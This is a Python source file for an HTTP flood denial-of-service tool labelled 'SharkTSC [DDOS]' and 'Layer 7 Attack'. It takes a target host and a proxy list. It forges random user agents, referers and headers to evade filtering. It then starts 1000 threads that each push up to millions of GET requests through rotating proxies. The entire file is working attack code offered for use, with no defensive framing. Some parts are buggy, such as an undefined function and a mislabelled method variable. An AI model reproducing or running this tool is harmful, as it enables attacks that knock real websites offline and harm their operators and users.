from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import string
import requests
import socks
import ssl 
import datetime
import pycurl
from hyper.contrib import HTTP20Adapter
###################[TSC]#####################
ind_dict = {}
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice
###################[TSC]#####################

def sedot_parameters():
	global url,thr,item,referer,uri,method,isbot,proxies
	global cookies
	thr = 2000
	host = "118.98.73.214" 
	host = "www.google.com"
	path = "/" 		
	uri = "/"   				# lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp
	method = "GET"				# GET / POST
	data_post = ""				# dhostakai hanya untuk method = POST, misalnya: user=test&pass=test
	isbot=0
	
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--host", dest="url",help="attack to server host --host www.target.com")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 200 -t 200")
	optp.add_option("-a","--path",dest="path",help="default /  -a /db.php")
	optp.add_option("-u","--uri",dest="uri",help="default /  -u /index.jsp")
	optp.add_option("-m","--method",dest="method",help="default GET  -m GET")
	optp.add_option("-d","--data",dest="data",help="default  -d user=test&pass=test")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	optp.add_option("-x","--proxy", dest="out_file",help="proxy server host")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.url is None:
		usage()
	else:
		url = opts.url
	if opts.turbo is None:
		thr = 1000
	else:
		thr = 1000
	if opts.path is None:
		path = "/"
	else:
		path = opts.path
	if opts.uri is None:
		uri = "/"
	else:
		uri = opts.uri
	if opts.method is None:
		uri = "GET"
	else:
		uri = opts.method
	if opts.data is None:
		data_post = ""
	else:
		data_post = opts.data
	if opts.out_file is None:
		out_file = str("socks_tsc.txt")
	else:
		out_file = str(out_file)

	ParseUrl(url)
	print (" List Proxies Out : %s" %(len(open(out_file).readlines())))
	check_list(out_file)
	proxies = open(out_file).readlines()

def check_list(socks_file):
	print("> Checking list :>>")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def ParseUrl(original_url):
	global host
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	host = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def usage():
	print ('''
	-s or --host = "www.google.com"
	-p or --port = 80 > 80 (http) or 443 (htttps)
	-t or --turbo  = 200 > defaul 200
	-a or --path = "/" > /index.php | login.php |
	-u or --uri = "/" > lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp 
	
	-m or --method = "GET" > GET / POST / HEAD
	-d or --data = "" > dhostakai hanya untuk method = POST, misalnya: user=test&pass=test
	-x or --proxy = proxy file = :
	''')
	sys.exit()

referers = [
			"https://www.google.com/search?q=",
			"https://check-host.net/check-http?host=",
			"https://www.facebook.com/",
			"https://www.youtube.com/",
			"https://www.fbi.com/",
			"https://www.bing.com/search?q=",
			"https://r.search.yahoo.com/",
			"https://www.cia.gov/index.html",
			"https://vk.com/profile.php?redirect=",
			"https://www.usatoday.com/search/results?q=",
			"https://help.baidu.com/searchResult?keywords=",
			"https://steamcommunity.com/market/search?q=",
			"https://www.ted.com/search?q=",
			"https://play.google.com/store/search?q=",
			"https://www.qwant.com/search?q=",
			"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
			"https://www.google.ad/search?q=",
			"https://www.google.ae/search?q=",
			"https://www.google.com.af/search?q=",
			"https://www.google.com.ag/search?q=",
			"https://www.google.com.ai/search?q=",
			"https://www.google.al/search?q=",
			"https://www.google.am/search?q=",
			"https://www.google.co.ao/search?q=",
			"https://check-host.net/check-http?host=",
			"https://check-host.net/check-tcp?host=",
			"https://check-host.net/check-ping?host=",
			"https://check-host.net/check-dns?host=",
			"https://l.facebook.com/l.php?u=",
			"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
			"https://l.facebook.com/l.php?u=",
			"",
		]
acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))

    return data


global data
data ='''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzhost,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive''';



def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0


def down_it():
	add = "?"
	if "?" in path:
		add = "&"
	if(port==80):
		referer="http://"
	elif(port==443):
		referer="https://"
	connection = "Connection: Keep-Alive\r\n"
	accept = Choice(acceptall)
	referer2 = "Referer: "+ referer + host + path + "\r\n"
	Cookie = 'Set-Cookie: __cfduid=d5927a7cbaa96ec536939f93648e3c08a1576098703' + "\r\n"
	useragent = "User-Agent: " + getuseragent() + "\r\n"
	Cache = 'Cache-Control: max-age=0\r\n'
	Cache1 = 'origin: '+referer+host+'/'+'\r\n'
	Cache2 = 'content-type: application/json\r\n'
	Cache3 = 'x-test: true\r\n'
	header =  referer2 + useragent + accept + connection + Cookie + Cache + Cache1 + Cache2 + Cache3 +"\r\n"
	proxy = random.choice(proxies).strip().split(":")
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]), HTTP20Adapter())
			s.connect((host, int(port)))
			if(port==443):
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
				ctx.set_alpn_protocols(['h2c'])
				s = ctx.wrap_socket(s,server_hostname=host)
			if(port==80):
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
				ctx.set_alpn_protocols(['h2c'])
				s = ctx.wrap_socket(s,server_hostname=host)
			try:
				for n in range(int(6000000)):
					get_host = "GET " + path + " HTTP/1.2\r\nHost: " + host + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					print(f"{proxy[0]}:{proxy[1]} >> 200 (OK) {referer}{host}:{port}{path}")
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						s.close()
						break
			except:
				proxy = Choice(proxies).strip().split(":")
		except:
			s.close()
def exit():
	sys.exit()

q = Queue()
w = Queue()

def dos():
	while True:
		item = q.get()
		q.task_done()   
        
def dos2():
	while True:
		item=w.get()
		bot_hammering(item)
		w.task_done()
if __name__ == '__main__':
	sedot_parameters()
	print("")
	print(" __________________________________")
	print("|         Layer 7 Attack           |")
	print("|        SharkTSC  [DDOS]          | ")
	print("|__________________________________|")
	print(" Web: ",host)
	SetupIndDict()
	for i in range(1000):
		t24 = threading.Thread(target=down_it)
		t24.start()